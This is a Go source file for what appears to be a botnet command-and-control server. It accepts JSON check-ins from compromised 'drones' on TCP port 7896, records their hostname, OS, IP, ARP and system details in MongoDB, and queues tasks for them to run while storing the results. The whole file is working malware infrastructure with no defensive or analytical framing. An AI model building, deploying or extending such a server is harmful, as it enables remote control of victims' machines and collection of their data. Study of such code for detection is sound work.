package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"strconv"
	"time"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

type genericDrone struct {
	Action      string `bson:"action"`
	Status      string `bson:"status"`
	ID          string `bson:"id"`
	Hostname    string `bson:"hostname"`
	OS          string `bson:"os"`
	Dronetime   string `bson:"dronetime"`
	Tasks       string `bson:"tasks"`
	Tasksresult string `bson:"tasksresult"`
	IPinfo      string `bson:"ipinfo"`
	Arpinfo     string `bson:"arpinfo"`
	Sysinfo     string `bson:"sysinfo"`
	Sleeptime   int    `bson:"sleeptime"`
}

func main() {
	startServer()
}

func startServer() {

	listen, err := net.Listen("tcp", "0.0.0.0:7896")
	if err != nil {
		log.Fatal(err)
	}
	defer listen.Close()

	for {

		conn, err := listen.Accept()
		if err != nil {
			log.Println(err)
		}

		go handleCheckin(conn)

	}

}

func handleCheckin(conn net.Conn) {
	incoming, err := bufio.NewReader(conn).ReadString('}')
	if err != nil {
		log.Println(err)
	}

	inBytes := []byte(incoming)

	var Drone genericDrone
	err = json.Unmarshal(inBytes, &Drone)
	if err != nil {
		log.Println(err)
	}

	Drone = parseAction(Drone)

	outBytes, err := json.Marshal(Drone)
	if err != nil {
		log.Println(err)
	}
	conn.Write(outBytes)
	conn.Close()

}

func parseAction(Drone genericDrone) (outDrone genericDrone) {
	switch Drone.Action {
	case "Register":
		Drone = registerDrone(Drone)
		return Drone
	case "GetTasks":
		Drone = getTasks(Drone)
		return Drone
	case "TaskComplete":
		Drone = tasksCompleted(Drone)
		return Drone
	}
	return Drone
}

func connectDB() (client *mongo.Client, Drones *mongo.Collection, ctx context.Context) {
	client, err := mongo.NewClient(options.Client().ApplyURI("mongodb://x.x.x.x:7895"))
	if err != nil {
		log.Println(err)
	}

	ctx, _ = context.WithTimeout(context.Background(), 5*time.Second)
	err = client.Connect(ctx)
	if err != nil {
		log.Println(err)
	}

	DroneDB := client.Database("DroneDB")
	Drones = DroneDB.Collection("Drones")

	return client, Drones, ctx
}

func tasksCompleted(Drone genericDrone) (outDrone genericDrone) {

	client, Drones, ctx := connectDB()

	var Action bson.M
	if err := Drones.FindOne(ctx, bson.D{{"id", Drone.ID}}).Decode(&Action); err != nil {
		log.Println(err)
	}

	record := fmt.Sprintf("%s", Action["tasksresult"])
	record += Drone.Tasksresult

	opts := options.FindOneAndUpdate().SetUpsert(true)
	filter := bson.D{{"id", Drone.ID}}
	update := bson.D{{"$set", bson.D{{"tasksresult", record}}}}

	var updatedDoc bson.M
	updateErr := Drones.FindOneAndUpdate(ctx, filter, update, opts).Decode(&updatedDoc)
	if updateErr != nil {
		if updateErr == mongo.ErrNoDocuments {
			return
		}
		log.Println(updateErr)
	}

	Drone.Tasks = ""
	Drone.Tasksresult = ""
	Drone.Action = "WaitTasks"
	client.Disconnect(ctx)
	clearTasks(Drone)
	return Drone

}

func clearTasks(Drone genericDrone) {
	client, Drones, ctx := connectDB()
	opts := options.FindOneAndUpdate().SetUpsert(true)
	filter := bson.D{{"id", Drone.ID}}
	update := bson.D{{"$set", bson.D{{"tasks", ""}}}}
	var clearField bson.M
	updateErr := Drones.FindOneAndUpdate(ctx, filter, update, opts).Decode(&clearField)
	if updateErr != nil {
		if updateErr == mongo.ErrNoDocuments {
			return
		}
		log.Println(updateErr)
	}
	client.Disconnect(ctx)
}

func registerDrone(Drone genericDrone) (outDrone genericDrone) {

	client, Drones, ctx := connectDB()

	var checkExists bson.M
	if checkErr := Drones.FindOne(ctx, bson.D{{"id", Drone.ID}}).Decode(&checkExists); checkErr != nil {
		if checkErr.Error() == "mongo: no documents in result" {
			Drone.Action = "WaitTasks"
			Drone.Status = "Active"
			Drone.Sleeptime = 15
			addBot, err := Drones.InsertOne(ctx, Drone)
			if err != nil {
				log.Println(err)
			}
			fmt.Printf("new bot registered, %v\n", addBot)
		}
	} else {
		Drone.Action = "WaitTasks"
		Drone.Status = "Active"
		Drone.Sleeptime = 15
	}
	client.Disconnect(ctx)

	return Drone
}

func getTasks(Drone genericDrone) (outDrone genericDrone) {

	client, Drones, ctx := connectDB()
	var Action bson.M
	if err := Drones.FindOne(ctx, bson.D{{"id", Drone.ID}}).Decode(&Action); err != nil {
		log.Println(err)
	}
	if Action["tasks"] == "" {
		Drone.Action = "WaitTasks"
		Drone.Sleeptime, _ = strconv.Atoi(fmt.Sprintf("%s", Action["sleeptime"]))
	} else {
		Drone.Action = "ExecTasks"
		Drone.Tasks = fmt.Sprintf("%s", Action["tasks"])
		Drone.Status = "Busy"
	}

	client.Disconnect(ctx)
	return Drone
}
